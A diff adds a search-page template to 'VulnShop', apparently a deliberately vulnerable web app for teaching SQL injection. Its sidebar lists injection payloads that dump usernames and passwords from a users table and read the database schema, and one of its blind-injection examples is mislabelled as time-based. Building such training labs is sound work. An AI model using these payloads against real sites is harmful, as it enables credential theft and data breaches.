@@ -1,0 +1,104 @@
+{% extends "base.html" %}
+
+{% block title %}Search - VulnShop{% endblock %}
+
+{% block content %}
+<div class="row">
+    <div class="col-md-12">
+        <h2><i class="fas fa-search"></i> Product Search</h2>
+        <div class="alert alert-warning">
+            <i class="fas fa-exclamation-triangle"></i> <strong>SQL Injection Vulnerability:</strong> 
+            This search is vulnerable to SQL injection attacks.
+        </div>
+    </div>
+</div>
+
+<div class="row">
+    <div class="col-md-8">
+        <div class="card">
+            <div class="card-body">
+                <form method="GET" action="{{ url_for('search') }}">
+                    <div class="input-group mb-3">
+                        <input type="text" class="form-control form-control-lg" name="q" 
+                               value="{{ query }}" placeholder="Search for products...">
+                        <button class="btn btn-primary btn-lg" type="submit">
+                            <i class="fas fa-search"></i> Search
+                        </button>
+                    </div>
+                </form>
+                
+                {% if query %}
+                    <div class="alert alert-info">
+                        <strong>Search Query:</strong> <code>{{ query }}</code>
+                    </div>
+                {% endif %}
+                
+                {% if products %}
+                    <h4>Search Results ({{ products|length }} found)</h4>
+                    <div class="row">
+                        {% for product in products %}
+                        <div class="col-md-6 mb-3">
+                            <div class="card">
+                                <div class="card-body">
+                                    <h5 class="card-title">{{ product[1] }}</h5>
+                                    <p class="card-text">{{ product[3] }}</p>
+                                    <p class="text-muted">Price: ${{ product[2] }}</p>
+                                    <button class="btn btn-sm btn-outline-primary">View Details</button>
+                                </div>
+                            </div>
+                        </div>
+                        {% endfor %}
+                    </div>
+                {% elif query %}
+                    <div class="alert alert-warning">
+                        <i class="fas fa-exclamation-circle"></i> No products found for "{{ query }}"
+                    </div>
+                {% endif %}
+            </div>
+        </div>
+    </div>
+    
+    <div class="col-md-4">
+        <div class="card">
+            <div class="card-header bg-danger text-white">
+                <h5><i class="fas fa-bug"></i> SQL Injection Examples</h5>
+            </div>
+            <div class="card-body">
+                <p>Try these payloads to exploit the search:</p>
+                <div class="list-group">
+                    <div class="list-group-item">
+                        <h6>Union-based Injection:</h6>
+                        <code>' UNION SELECT 1,username,password,email FROM users --</code>
+                    </div>
+                    <div class="list-group-item">
+                        <h6>Extract Database Schema:</h6>
+                        <code>' UNION SELECT 1,name,sql,type FROM sqlite_master --</code>
+                    </div>
+                    <div class="list-group-item">
+                        <h6>Boolean-based Blind:</h6>
+                        <code>' AND (SELECT COUNT(*) FROM users) > 0 --</code>
+                    </div>
+                    <div class="list-group-item">
+                        <h6>Time-based Blind:</h6>
+                        <code>' AND (SELECT COUNT(*) FROM users WHERE username='admin') > 0 --</code>
+                    </div>
+                </div>
+            </div>
+        </div>
+        
+        <div class="card mt-3">
+            <div class="card-header bg-info text-white">
+                <h5><i class="fas fa-lightbulb"></i> Learning Tips</h5>
+            </div>
+            <div class="card-body">
+                <ul class="list-unstyled">
+                    <li><i class="fas fa-check text-success"></i> Observe how the query is constructed</li>
+                    <li><i class="fas fa-check text-success"></i> Try different injection techniques</li>
+                    <li><i class="fas fa-check text-success"></i> Extract sensitive information</li>
+                    <li><i class="fas fa-check text-success"></i> Test for different SQL dialects</li>
+                </ul>
+            </div>
+        </div>
+    </div>
+</div>
+{% endblock %}
